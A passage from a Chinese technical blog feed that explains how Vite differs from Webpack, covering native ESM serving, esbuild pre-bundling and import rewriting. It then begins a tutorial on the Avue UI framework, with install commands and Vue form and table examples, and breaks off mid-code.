<p><img src="/assets/study-vite-3.png" alt="Vite"></p>
<blockquote>
<p>扩展</p>
</blockquote>
<ul>
<li>本地 node 环境对于  ECMAScript 6 的支持度</li>
</ul>
<p><img src="/assets/study-vite-4.png" alt="Vite"></p>
<ul>
<li>浏览器对 import 的支持度</li>
</ul>
<p><img src="/assets/study-vite-5.png" alt="Vite"></p>
<ul>
<li>浏览器对 export 的支持度</li>
</ul>
<p><img src="/assets/study-vite-6.png" alt="Vite"></p>
<h2 id="vite-vs-webpack" tabindex="-1"> Vite VS Webpack</h2>
<h3 id="功能对比" tabindex="-1"> 功能对比</h3>
<table>
<thead>
<tr>
<th></th>
<th>Vite</th>
<th>Webpack</th>
</tr>
</thead>
<tbody>
<tr>
<td>支持 Vue2</td>
<td>非官方支持: <a href="https://link.segmentfault.com/?url=https%3A%2F%2Fgithub.com%2Funderfin%2Fvite-plugin-vue2" target="_blank" rel="noopener noreferrer">https://github.com/underfin/vite-plugin-vue2</a></td>
<td>支持：vue-loader@^15.0.0</td>
</tr>
<tr>
<td>支持 Vue3</td>
<td>支持</td>
<td>支持：vue-loader@^16.0.0(<a href="https://link.segmentfault.com/?url=https%3A%2F%2Fgithub.com%2FJamie-Yang%2Fvue3-boilerplate" target="_blank" rel="noopener noreferrer">https://github.com/Jamie-Yang/vue3-boilerplate</a>)</td>
</tr>
<tr>
<td>支持 Typescript</td>
<td>支持：ESbuild （默认无类型检查）</td>
<td>支持：ts-loader</td>
</tr>
<tr>
<td>支持 CSS 预处理器</td>
<td>支持： <a href="https://link.segmentfault.com/?url=https%3A%2F%2Fvitejs.dev%2Fguide%2Ffeatures.html%23css-pre-processors" target="_blank" rel="noopener noreferrer">https://vitejs.dev/guide/features.html#css-pre-processors</a></td>
<td>支持：<a href="https://link.segmentfault.com/?url=https%3A%2F%2Fvue-loader.vuejs.org%2Fguide%2Fpre-processors.html" target="_blank" rel="noopener noreferrer">https://vue-loader.vuejs.org/guide/pre-processors.html</a></td>
</tr>
<tr>
<td>支持 CSS Modules</td>
<td>支持： <a href="https://link.segmentfault.com/?url=https%3A%2F%2Fvitejs.dev%2Fguide%2Ffeatures.html%23css-modules" target="_blank" rel="noopener noreferrer">https://vitejs.dev/guide/features.html#css-modules</a></td>
<td>支持：<a href="https://link.segmentfault.com/?url=https%3A%2F%2Fvue-loader.vuejs.org%2Fguide%2Fcss-modules.html" target="_blank" rel="noopener noreferrer">https://vue-loader.vuejs.org/guide/css-modules.html</a></td>
</tr>
<tr>
<td>支持静态文件</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>开发环境</td>
<td>no-bundle native ESM（CJS → ESM）</td>
<td>bundle（CJS/UMD/ESM）</td>
</tr>
<tr>
<td>HMR</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>生产环境</td>
<td>Rollup、esbuild</td>
<td>Webpack</td>
</tr>
<tr>
<td>Node API 调用能力</td>
<td>支持</td>
<td>支持</td>
</tr>
</tbody>
</table>
<h3 id="webpack-打包方式" tabindex="-1"> Webpack 打包方式</h3>
<p><img src="/assets/study-vite-7.png" alt="Vite"></p>
<p><img src="/assets/study-vite-8.png" alt="Vite"></p>
<ul>
<li>webpack 的打包时间与应用的大小是成正比的, 应用越大打包时间越久</li>
<li>打包过程：识别入口文件 =&gt; 通过逐层识别模块依赖。（Commonjs、amd 或者 es6 的 import, webpack 都会对其进行分析。来获取代码的依赖）=&gt; webpack 做的就是分析代码。转换代码, 编译代码, 输出代码 =&gt; 最终形成打包后的代码</li>
<li>根据路由把代码整合成一个文件 bundle.js,启动开发服务器 Serverready</li>
<li>vue-cli-server serve(启动服务器) → build(打包) → bundle(内存) → 启动 web server（即 Dev Server 必须等待所有模块构建完成）</li>
<li>如果改了一个模块, 是会经过重新打包的, 但是不会全部打包, 它会根据路由解析的路径差异化的打包, 但是会把内存里面的 bundle 替换, 替换完了之后再一次重启服务器</li>
<li>webpack 是会把所有的模块进行提前编译, 之后打包进 bundle 里, 换句话说, 不管模块是否会被执行, 都会被编译和打包到 bundle</li>
</ul>
<h3 id="vite-打包方式" tabindex="-1"> Vite 打包方式</h3>
<p><img src="/assets/study-vite-9.png" alt="Vite"></p>
<p><img src="/assets/study-vite-10.png" alt="Vite"></p>
<ul>
<li>先去启动服务器, 当浏览器向服务器发送请求的时候, 浏览器需要哪些文件, 服务器 就可以返回哪些文件</li>
<li>前端需要什么,服务器就给什么,不需要打包,根据不同的路由返回不同的模块/文件 （服务器此时对请求的文件进行编译, 编译后将编译结果返回给浏览器）</li>
<li>vite 可以做到压缩打包时间, vite 打包时将项目拆分为源码和依赖两部分, 依赖部分无需打包直接加载, 源码部分只需将浏览器不兼容的转成 JavaScript 即可</li>
<li>Vite 以 原生 ESM 方式服务源码。这实际上是让浏览器接管了打包程序的部分工作：Vite 只需要在浏览器请求源码时进行转换并按需提供源码。根据情景动态导入的代码, 即只在当前屏幕上实际使用时才会被处理。</li>
</ul>
<h2 id="从-vite-源码看-vite-原理" tabindex="-1"> 从 Vite 源码看 Vite 原理</h2>
<h3 id="esm-based-dev-server-存在的问题" tabindex="-1"> ESM-based Dev Server 存在的问题</h3>
<ul>
<li>非 ESM 模块兼容（TS/JSX/CSS...）</li>
<li>Broswer ESM 不能加载 Node 模块</li>
<li>Node 模块的其他问题</li>
<li>浏览器没有环境变量</li>
</ul>
<h3 id="vite-如何解决问题" tabindex="-1"> Vite 如何解决问题</h3>
<blockquote>
<p>问题：非 ESM 模块兼容（TS/JSX/CSS...）解决方案：将非 ESM 模块转换成 ESM, 至于 TS 或者 JSX 是通过 esbuild 进行转换, esbuild 可以代替 TSC/Babel</p>
</blockquote>
<p>Vite 在第一次运行的时候, 会先去分析项目底下的开发依赖, 然后使用 esbuild 将亘古不变的依赖进行提取（这一步叫做预打包）, 将提取到的 ESM 模块统一存放在 node_modules/.vite 这个文件夹下, 下一次运行的时候只要没有新增的依赖项将不会进行提取, 即使新增了一项新的依赖, esbuild 也只会提取新加入的依赖项。 ​ vite 会将应用的模块拆分成依赖和源码部分, 依赖部分即是 package.json 中的运行依赖, 该部分依赖将会通过 esbuild 进行依赖提取源码 通常包含一些并非直接是 JavaScript 的文件, 需要转换（例如 JSX, CSS 或者 Vue/Svelte 组件）, 这一部分通常是交给 Rollup 进行处理</p>
<p>至于使用了 TS 的应用, esbuild 会将含有 TS 的代码转换成原生的 ESM, 在将其返回给浏览器, 这样浏览器就可以加载该模块而对于 vue 文件, 也会对其编译成 js, 可以从请求头中也可以看到, vue 文件实际上被转换成 js 文件了将要处理的 template,script,style 等所需依赖以 http 请求的形式、通过 query 参数的形式区分, 并加载 SFC(vue 单文件)文件各个模块内容。 vite 是基于浏览器对 ESMoudule 的支持, script 标签加上 <code>type=&quot;module&quot;</code>  就可以解析 ES6 模块, 浏览器解析到 ES6 的 import 语法时, 会根据路径从服务端获取要引入的文件, 服务端会根据 import 的文件路径和类型进行解析</p>
<p><img src="/assets/study-vite-11.png" alt="Vite"></p>
<blockquote>
<p>问题：Node 模块的其他问题解决方案：将多个模块合并成一个文件, 即一个请求</p>
</blockquote>
<ul>
<li>Node 模块会随着应用的体积而增多, 在 vite 中一个文件就是一个请求, 如果有非常多的 Node 模块也只能使 vite 的性能降低</li>
<li>vite 使用依赖预优化（esbulid）,将多个 Node 模块打包成一个文件, 通过 http 进行缓存, 下次请求到同样的, 直接从缓存获取</li>
<li>Vite 将会使用 esbuild 预构建依赖。Esbuild 使用 Go 编写, 并且比以 JavaScript 编写的打包器预构建依赖快 10-100 倍</li>
</ul>
<blockquote>
<p>问题：Broswer ESM 不能加载 Node 模块解决方案：引入 es-module-lexer 和 magic-string, 或者引入 koa 中间件</p>
</blockquote>
<div><pre><code><span>{</span>
  <span>"es-module-lexer"</span><span>:</span> <span>"^0.7.1"</span><span>,</span>
  <span>"magic-string"</span><span>:</span> <span>"^0.25.7"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><ul>
<li>使用 es-module-lexer 扫描所有的 import 语法</li>
<li>magic-string 将重写 Node 模块的引入路径</li>
</ul>
<div><pre><code><span>// source</span>
<span>import</span> <span>{</span> createAPP <span>}</span> <span>from</span> <span>"vue"</span><span>;</span>
<span>// rewite to</span>
<span>import</span> <span>{</span> createAPP <span>}</span> <span>from</span> <span>"/node_modules/.vite/vue.js?v=7e85f123"</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><blockquote>
<p>扩展：Vite 1.0 的解决方案</p>
</blockquote>
<div><pre><code><span>{</span>
  <span>"rollup"</span><span>:</span> <span>"^2.32.1"</span><span>,</span>
  <span>"@rollup/plugin-commonjs"</span><span>:</span> <span>"^16.0.0"</span><span>,</span>
  <span>"koa"</span><span>:</span> <span>"^2.13.0"</span><span>,</span>
  <span>"koa-proxies"</span><span>:</span> <span>"^0.11.0"</span><span>,</span>
  <span>"koa-static"</span><span>:</span> <span>"^5.0.0"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>从上我们可以看到, vite 引入入 koa 服务器, 开发时, vite 使用 Koa 构建的服务端, 在 createServer 中主要通过中间件注册相关功能, 提供一个 web server 去代理, 之后浏览器通过 http 进行请求模块。为什么会需要 koa 这样的服务来代理请求, 因为我们的开发依赖都是安装在 node_modules 中, 浏览器 ES Module 是无法直接获取到项目下 node_modules 目录中的文件, 其过程如下：</p>
<ul>
<li>通过 koa 中间件获取请求 body</li>
<li>使用 es-module-lexer 解析资源 ast</li>
<li>获取 import 的内容后, 判断资源是否是绝对路径, 绝对视为 npm 模块</li>
<li>返回处理后的路径给浏览器, 例如：&quot;vue&quot; =&gt; &quot;/@modules/vue&quot;</li>
</ul>
<blockquote>
<p>问题：浏览器没有环境变量解决方案：将环境变量注入到 import.meta.env</p>
</blockquote>
<div><pre><code><span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>MODE</span><span>;</span> <span>// {string}应用程序运行的模式。</span>

<span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>BASE_URL</span><span>;</span> <span>// {string} 应用程序提供服务的基础url。这由基本配置选项决定。</span>

<span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>PROD</span><span>;</span> <span>// {boolean} 是否在生产环境中运行。</span>

<span>import</span><span>.</span>meta<span>.</span>env<span>.</span><span>DEV</span><span>;</span> <span>//{boolean}应用是否在开发中运行(总是与import.meta.env.PROD相反)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="vite-缺点" tabindex="-1"> Vite 缺点</h3>
<ul>
<li>生态不如 webpack
<ul>
<li>webpack 有非常丰富的 loader 和 plugin</li>
<li>vite 目前无法把 webpack 中的 loader 和 plugin 全部实现</li>
</ul>
</li>
<li>prod 环境的构建, 目前用的 Rollup
<ul>
<li>原因在于 esbuild 对于 css 和代码分割不是很友好</li>
<li>未来 esbuild 可能是一种趋势, esbuild 的生态做的越好的话, 越有可能直接替换 Rollup</li>
</ul>
</li>
</ul>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/study-vite-1.png" type="image/png"/>
    </item>
    <item>
      <title>Avue 前端框架使用实践</title>
      <link>https://vxhly.github.io/views/vuejs/avue-framework-practice.html</link>
      <guid>https://vxhly.github.io/views/vuejs/avue-framework-practice.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Avue 前端框架使用实践</source>
      <description>前言
Avue 前端是基于 ElementUI 库进行的二次封装, 简化了一些繁琐的操作。本篇博文将带领大家学习这套框架的使用实践, 以及它的一些二次封装的思路。

</description>
      <category>vuejs</category>
      <pubDate>Thu, 20 Aug 2020 11:39:08 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Avue 前端是基于 ElementUI 库进行的二次封装, 简化了一些繁琐的操作。本篇博文将带领大家学习这套框架的使用实践, 以及它的一些二次封装的思路。</p>
</div>

<h2 id="关于-avue" tabindex="-1"> 关于 Avue</h2>
<h3 id="参考地址" tabindex="-1"> 参考地址</h3>
<ul>
<li>Github 仓库：<a href="https://github.com/nmxiaowei/avue" target="_blank" rel="noopener noreferrer">nmxiaowei/avue</a></li>
<li>Gitee 仓库：<a href="https://gitee.com/smallweigit/avue" target="_blank" rel="noopener noreferrer">smallwei/Avue</a></li>
<li>Avue 官方文档：<a href="https://avuejs.com/" target="_blank" rel="noopener noreferrer">Avue</a></li>
<li>ElementUI 官方文档：<a href="https://element.eleme.cn/#/zh-CN/component/installation" target="_blank" rel="noopener noreferrer">ElementUI</a></li>
<li>基于 Avue 的后台管理系统示例: <a href="https://cli.avuejs.com/wel/index" target="_blank" rel="noopener noreferrer">Avue 后台管理系统</a></li>
</ul>
<h3 id="简介" tabindex="-1"> 简介</h3>
<div><p>简介</p>
<p>Avue.js 是基于现有的 element-ui 库进行的二次封装, 从而简化一些繁琐的操作, 核心理念为数据驱动视图, 主要的组件库针对 table 表格和 form 表单场景, 同时衍生出更多企业常用的组件, 达到高复用, 容易维护和扩展的框架, 同时内置了丰富了数据展示组件, 让开发变得更加容易。</p>
<p>它的核心是数据驱动 UI 的思想, 让我们从繁琐的 crud 开发中解脱出来, 他的写法类似 easyUI, 但是写起来比 easyUI 更加容易, 因为它是集合了 vue 中的数据双向绑定特性以及其他的一些特性。内含大量的组件和插件, 例如 crud、表单、数据展示卡、人物展示卡、打印的插件、Excel 导入插件等。</p>
<p>缺点是生态不好, 出错网上没有解决方案, 对于定制化要求比较高的需求, 使用 avue 不是很方便。当然除了而二次封装的 element-ui 库, 还有二次封装的 ant-design-vue 、echarts、vant, 维护比较好组件也比较全面当属 element-ui 库, 其中二次封装 ant-design-vue 、vant 暂未开放给用户使用。</p>
</div>
<p>使用 Avue 好处：</p>
<ol>
<li>让开发人员更加的关注业务代码, 而无需过多的关心页面的布局</li>
<li>简洁高效, 通过简单的配置项即可组合出我们想要的效果</li>
<li>提供了大量的常用组件库以及丰富的插件库</li>
<li>兼容现在的主流浏览器, 开箱即用的插件引入模式</li>
</ol>
<p>Avue 的组件组成：</p>
<ol>
<li>单组件, 在 element-ui 库中的组件进行二次封装, 让使用更加方便</li>
<li>CRUD 组件, 即表格组件, 常用于需要使用表单来展示数据的业务或者是日常 CRUD 的一些操作, 文档地址：<a href="https://avuejs.com/doc/crud/crud-doc" target="_blank" rel="noopener noreferrer">Avue CRUD 组件</a></li>
<li>表单组件, 常用于数据收集、数据修改等业务, 文档地址：<a href="https://avuejs.com/doc/form/form-doc" target="_blank" rel="noopener noreferrer">Avue FORM 组件</a></li>
<li>数据展示组件, 常用与一些需要数据展示的一些业务, 常见于大数据类的后台管理系统中的首页里面的一些数据统计, 文档地址：<a href="https://avuejs.com/doc/data/data0" target="_blank" rel="noopener noreferrer">Avue Data 组件</a></li>
<li>其他组件, 封装的一些常用的组件(比较杂, 例如：打印、评论、拖拽、水印)</li>
</ol>
<h3 id="浏览器兼容性" tabindex="-1"> 浏览器兼容性</h3>
<div><p>Vue.js 的兼容性</p>
<p>Vue 不支持 IE8 及以下版本, 因为 Vue 使用了 IE8 无法模拟的 ECMAScript 5 特性。但它支持所有<a href="https://caniuse.com/#feat=es5" target="_blank" rel="noopener noreferrer">兼容 ECMAScript 5 的浏览器</a>。</p>
</div>
<div><p>Avue 的兼容性</p>
<p>支持所有符合 ES5 标准的浏览器(不支持 IE8 及以下版本）.</p>
</div>
<h2 id="实践" tabindex="-1"> 实践</h2>
<h3 id="下载与引入" tabindex="-1"> 下载与引入</h3>
<h4 id="下载" tabindex="-1"> 下载</h4>
<p>使用 npm 或者 yarn 就可以对 Avue 这套 UI 框架进行下载, 并将该依赖写入到 <code>package.json</code> 中</p>
<div><pre><code><span>npm</span> i @smallwei/avue
<span># or</span>
<span>yarn</span> <span>add</span> @smallwei/avue
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="完整引入" tabindex="-1"> 完整引入</h4>
<div><p>提示</p>
<p>Avue 目前不支持按需引入, 只支持完整引入</p>
</div>
<p>与其他 UI 框架的一样引入方式, 在项目的 <code>main.js</code> 中添加以下代码即可</p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> Avue <span>from</span> <span>"@smallwei/avue"</span><span>;</span>
<span>import</span> <span>"@smallwei/avue/lib/index.css"</span><span>;</span>

Vue<span>.</span><span>use</span><span>(</span>Avue<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="使用案例" tabindex="-1"> 使用案例</h2>
<p>在使用前, 我们还需要另外的导入 element-ui 库的依赖, 因为 Avue 是基于 element-ui 库进行的二次封装, 并且 Avue 源码中并没有为我们导出 element-ui 库的依赖。所以我们仍然需要在项目的 <code>main.js</code> 中添加 element-ui 库的依赖。</p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> ElementUI <span>from</span> <span>"element-ui"</span><span>;</span>
<span>import</span> <span>"element-ui/lib/theme-chalk/index.css"</span><span>;</span>

Vue<span>.</span><span>use</span><span>(</span>ElementUI<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div>
<h3 id="表单" tabindex="-1"> 表单</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>avue-form</span> <span>ref</span><span><span>=</span><span>"</span>form<span>"</span></span> <span>v-model</span><span><span>=</span><span>"</span>obj<span>"</span></span> <span>:option</span><span><span>=</span><span>"</span>option<span>"</span></span> <span>@submit</span><span><span>=</span><span>"</span>submit<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>footer<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>span</span> <span><span>style</span><span><span>=</span><span>"</span><span><span>color</span><span>:</span>red<span>;</span><span>text-align</span><span>:</span>right<span>;</span><span>display</span><span>:</span>inline-block<span>;</span><span>width</span><span>:</span>100%<span>;</span></span><span>"</span></span></span>
        <span>></span></span>打 * 的为必填项<span><span><span>&lt;/</span>span</span>
      <span>></span></span>
    <span><span><span>&lt;/</span>template</span><span>></span></span>
  <span><span><span>&lt;/</span>avue-form</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"MyForm"</span><span>,</span>

  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>obj</span><span>:</span> <span>{</span>
        <span>title</span><span>:</span> <span>"我是表单的表头"</span><span>,</span>
        <span>name</span><span>:</span> <span>""</span><span>,</span>
        <span>tag</span><span>:</span> <span>""</span><span>,</span>
        <span>sex</span><span>:</span> <span>""</span><span>,</span>
      <span>}</span><span>,</span>
      <span>option</span><span>:</span> <span>{</span>
        <span>card</span><span>:</span> <span>true</span><span>,</span>
        <span>column</span><span>:</span> <span>[</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>""</span><span>,</span>
            <span>type</span><span>:</span> <span>"title"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"title"</span><span>,</span>
            <span>span</span><span>:</span> <span>24</span><span>,</span>
            <span>labelWidth</span><span>:</span> <span>0</span><span>,</span>
            <span>styles</span><span>:</span> <span>{</span>
              <span>textAlign</span><span>:</span> <span>"center"</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"名称"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"name"</span><span>,</span>
            <span>rules</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>required</span><span>:</span> <span>true</span><span>,</span>
                <span>message</span><span>:</span> <span>"请输入名称"</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"标签"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"tag"</span><span>,</span>
            <span>type</span><span>:</span> <span>"select"</span><span>,</span>
            <span>dicData</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项1"</span><span>,</span>
                <span>value</span><span>:</span> <span>"1"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项2"</span><span>,</span>
                <span>value</span><span>:</span> <span>"2"</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项3"</span><span>,</span>
                <span>value</span><span>:</span> <span>"3"</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
            <span>rules</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>required</span><span>:</span> <span>true</span><span>,</span>
                <span>message</span><span>:</span> <span>"请输入名称"</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"性别"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"sex"</span><span>,</span>
            <span>type</span><span>:</span> <span>"radio"</span><span>,</span>
            <span>span</span><span>:</span> <span>6</span><span>,</span>
            <span>dicData</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"男"</span><span>,</span>
                <span>value</span><span>:</span> <span>0</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"女"</span><span>,</span>
                <span>value</span><span>:</span> <span>1</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
            <span>rules</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>required</span><span>:</span> <span>true</span><span>,</span>
                <span>message</span><span>:</span> <span>"请选择性别"</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"兴趣爱好"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"hobby"</span><span>,</span>
            <span>type</span><span>:</span> <span>"checkbox"</span><span>,</span>
            <span>span</span><span>:</span> <span>12</span><span>,</span>
            <span>dicData</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项1"</span><span>,</span>
                <span>value</span><span>:</span> <span>0</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项2"</span><span>,</span>
                <span>value</span><span>:</span> <span>1</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项3"</span><span>,</span>
                <span>value</span><span>:</span> <span>2</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项4"</span><span>,</span>
                <span>value</span><span>:</span> <span>3</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项5"</span><span>,</span>
                <span>value</span><span>:</span> <span>4</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项6"</span><span>,</span>
                <span>value</span><span>:</span> <span>5</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>"公开资料"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"isPublish"</span><span>,</span>
            <span>span</span><span>:</span> <span>6</span><span>,</span>
            <span>type</span><span>:</span> <span>"switch"</span><span>,</span>
            <span>dicData</span><span>:</span> <span>[</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项1"</span><span>,</span>
                <span>value</span><span>:</span> <span>0</span><span>,</span>
              <span>}</span><span>,</span>
              <span>{</span>
                <span>label</span><span>:</span> <span>"选项2"</span><span>,</span>
                <span>value</span><span>:</span> <span>1</span><span>,</span>
              <span>}</span><span>,</span>
            <span>]</span><span>,</span>
          <span>}</span><span>,</span>
          <span>{</span>
            <span>label</span><span>:</span> <span>""</span><span>,</span>
            <span>type</span><span>:</span> <span>"title"</span><span>,</span>
            <span>prop</span><span>:</span> <span>"footer"</span><span>,</span>
            <span>span</span><span>:</span> <span>24</span><span>,</span>
            <span>labelWidth</span><span>:</span> <span>0</span><span>,</span>
            <span>formslot</span><span>:</span> <span>true</span><span>,</span>
          <span>}</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>

  <span>methods</span><span>:</span> <span>{</span>
    <span>emptytChange</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
    <span>submit</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="表格" tabindex="-1"> 表格</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>img</span> <span>ref</span><span><span>=</span><span>"</span>printImg<span>"</span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>display</span><span>:</span>none<span>;</span></span><span>"</span></span></span> <span>:src</span><span><span>=</span><span>"</span>printImg<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>avue-crud</span>
      <span>ref</span><span><span>=</span><span>"</span>crud<span>"</span></span>
      <span>:data</span><span><span>=</span><span>"</span>data<span>"</span></span>
      <span>:option</span><span><span>=</span><span>"</span>option<span>"</span></span>
      <span>:page.sync</span><span><span>=</span><span>"</span>page<span>"</span></span>
      <span>@row-del</span><span><span>=</span><span>"</span>rowDel<span>"</span></span>
    <span>></span></span>
      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>menuLeft<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>el-button</span>
          <span>icon</span><span><span>=</span><span>"</span>el-icon-printer<span>"</span></span>
          <span>type</span><span><span>=</span><span>"</span>primary<span>"</span></span>
          <span>size</span><span><span>=</span><span>"</span>small<span>"</span></span>
          <span>:loading</span><span><span>=</span><span>"</span>printLoading<span>"</span></span>
          <span>@click</span><span><span>=</span><span>"</span>rowPrint<span>"</span></span>
        <span>></span></span>
          打印
        <span><span><span>&lt;/</span>el-button</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>

      <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>tags<span>"</span></span> <span>slot-scope</span><span><span>=</span><span>"</span>scope<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>el-tag</span> <span>v-for</span><span><span>=</span><span>"</span>(item, index) in scope.row.tags<span>"</span></span> <span>:key</span><span><span>=</span><span>"</span>index<span>"</span></span><span>></span></span>
          {{ item }}
        <span><span><span>&lt;/</span>el-tag</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>
    <span><span><span>&lt;/</span>avue-crud</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> html2canvas <span>from</span> <span>"html2canvas"</span><span>;</span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"MyCrud"</span><span>,</span>

  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>printLoading</span><span>:</span> <span>false</span><span>,</span>
      <span>printImg</span><span>:</span> <span>""</span><span>,</span>
      <span>page</span><span>:</span> <span>{</span>
        <span>total</span><span>:</span> <span>1</span><span>,</span>
        <span>pageSize</span><span>:</span> <span>20</span><span>,</span>
        <span>pagerCount</span><span>:</span> <span>5</span><span>,</span>
      <span>}</span><span>,</span>
      <span>data</span><span>:</span> <span>[</span>
        <span>{</span>
          <span>title</span><span>:</span> <span>"1"</span><span>,</span>
          <span>desc</span><span>:</span> <span>"文件入库, 包含csv、excel等文件入库..."</span><span>,</span>
          <span>tag</span><span>:</span> <span>[</span><span>"2"</span><span>,</span> <span>"2"</span><span>]</span><span>,</span>
          <span>create_user</span><span>:</span> <span>"1"</span><span>,</span>
          <span>create_update</span><span>:</span> <span>"1"</span><span>,</span>
